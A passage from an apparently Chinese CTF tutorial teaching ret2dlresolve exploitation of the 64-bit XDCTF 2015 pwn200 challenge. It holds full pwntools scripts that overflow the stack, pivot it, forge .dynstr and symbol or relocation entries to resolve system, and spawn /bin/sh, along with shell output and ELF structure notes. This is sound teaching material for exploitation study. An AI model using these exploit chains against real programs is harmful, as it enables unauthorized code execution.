<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400771</span><span class=p>)</span> <span class=c1>#pop rsi; pop r15; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span> <span class=c1># pop rdi; ret</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=c1># print(len(rop.chain()))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stack_size</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=c1># reuse the vuln to stack pivot</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>new_stack</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=c1># now, we are on the new stack</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=p>))</span> <span class=c1># fake dynstr location</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span> <span class=c1># fake dynstr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>

<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>最终执行效果如下</p> <div class=highlight><pre><span></span><code>❯ python exp-no-relro-stack-pivot.py
[+] Starting local process &#39;./main_no_relro_64&#39;: pid 41149
[*] &#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64&#39;
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for &#39;./main_no_relro_64&#39;
[*] Switching to interactive mode
$ ls
exp-no-relro-stack-pivot.py  main_no_relro_64
</code></pre></div> <p>到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。</p> <p>这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>bss_addr</span><span class=p>))</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x200</span> <span class=c1># new stack size is 0x200</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>dump</span><span class=p>())</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=p>))</span>


<span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span>

<span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400771</span><span class=p>)</span> <span class=c1>#pop rsi; pop r15; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=mh>0x100</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>dump</span><span class=p>())</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <h3 id=partial-relro_1>Partial RELRO<a class=headerlink href=#partial-relro_1 title="Permanent link">&para;</a></h3> <p>还是利用 2015 年 xdctf 的 pwn200 进行介绍。</p> <div class=highlight><pre><span></span><code>❯ gcc -fno-stack-protector -z relro  -no-pie ../../main.c -o main_partial_relro_64
❯ checksec main_partial_relro_64
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</code></pre></div> <p>这里我们仍然以手工构造和基于工具构造两种方式来介绍 64 位下的 ret2dlresolve。</p> <h4 id=_4>手工伪造<a class=headerlink href=#_4 title="Permanent link">&para;</a></h4> <p>这里我们就不一步步展示了。直接采用最终的思路。</p> <h5 id=64_1>64 位的变化<a class=headerlink href=#64_1 title="Permanent link">&para;</a></h5> <p>首先，我们先来看一下 64 位中的一些变化。</p> <p>glibc 中默认编译使用的是 <code>ELF_Rela</code> 来记录重定位项的内容</p> <div class=highlight><pre><span></span><code><span class=k>typedef</span> <span class=k>struct</span>
<span class=p>{</span>
  <span class=n>Elf64_Addr</span>        <span class=n>r_offset</span><span class=p>;</span>                <span class=cm>/* Address */</span>
  <span class=n>Elf64_Xword</span>        <span class=n>r_info</span><span class=p>;</span>                        <span class=cm>/* Relocation type and symbol index */</span>
  <span class=n>Elf64_Sxword</span>        <span class=n>r_addend</span><span class=p>;</span>                <span class=cm>/* Addend */</span>
<span class=p>}</span> <span class=n>Elf64_Rela</span><span class=p>;</span>
<span class=cm>/* How to extract and insert information held in the r_info field.  */</span>
<span class=cp>#define ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span>
<span class=cp>#define ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span>
<span class=cp>#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span>
</code></pre></div> <p>这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。</p> <p>根据 IDA 里的重定位表的信息可以知道，write 函数在符号表中的偏移为 1（0x100000007h&gt;&gt;32） 。</p> <div class=highlight><pre><span></span><code>LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela &lt;601018h, 100000007h, 0&gt; ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela &lt;601020h, 200000007h, 0&gt; ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela &lt;601028h, 300000007h, 0&gt; ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela &lt;601030h, 400000007h, 0&gt; ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends
</code></pre></div> <p>确实在符号表中的偏移为 1。</p> <div class=highlight><pre><span></span><code>LOAD:00000000004002C0 <span class=p>;</span> ELF Symbol Table
LOAD:00000000004002C0      Elf64_Sym &lt;<span class=m>0</span>&gt;
LOAD:00000000004002D8      Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>&gt; <span class=p>;</span> <span class=s2>&quot;write&quot;</span>
LOAD:00000000004002F0      Elf64_Sym &lt;offset aStrlen - offset byte_400398, 12h, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>&gt; <span class=p>;</span> <span class=s2>&quot;strlen&quot;</span>
LOAD:0000000000400308      Elf64_Sym &lt;offset aSetbuf - offset byte_400398, 12h, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>&gt; <span class=p>;</span> <span class=s2>&quot;setbuf&quot;</span>
LOAD:0000000000400320      Elf64_Sym &lt;offset aRead - offset byte_400398, 12h, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>, <span class=m>0</span>&gt; <span class=p>;</span> <span class=s2>&quot;read&quot;</span>
...
</code></pre></div> <p>在 64 位下，Elf64_Sym 结构体为</p> <div class=highlight><pre><span></span><code><span class=k>typedef</span> <span class=k>struct</span>
<span class=p>{</span>
  <span class=n>Elf64_Word</span>        <span class=n>st_name</span><span class=p>;</span>                <span class=cm>/* Symbol name (string tbl index) */</span>
  <span class=kt>unsigned</span> <span class=kt>char</span>        <span class=n>st_info</span><span class=p>;</span>                <span class=cm>/* Symbol type and binding */</span>
  <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>st_other</span><span class=p>;</span>                <span class=cm>/* Symbol visibility */</span>
  <span class=n>Elf64_Section</span>        <span class=n>st_shndx</span><span class=p>;</span>                <span class=cm>/* Section index */</span>
  <span class=n>Elf64_Addr</span>        <span class=n>st_value</span><span class=p>;</span>                <span class=cm>/* Symbol value */</span>
  <span class=n>Elf64_Xword</span>        <span class=n>st_size</span><span class=p>;</span>                <span class=cm>/* Symbol size */</span>
<span class=p>}</span> <span class=n>Elf64_Sym</span><span class=p>;</span>
</code></pre></div> <p>其中</p> <ul> <li>Elf64_Word 32 位</li> <li>Elf64_Section 16 位</li> <li>Elf64_Addr 64 位</li> <li>Elf64_Xword 64位</li> </ul> <p>所以，Elf64_Sym 的大小为 24 个字节。</p> <p>除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。</p> <div class=highlight><pre><span></span><code>.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500
</code></pre></div> <h5 id=first-try-leak>First Try - leak<a class=headerlink href=#first-try-leak title="Permanent link">&para;</a></h5> <p>根据上述的分析，我们可以写出如下脚本</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span> <span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
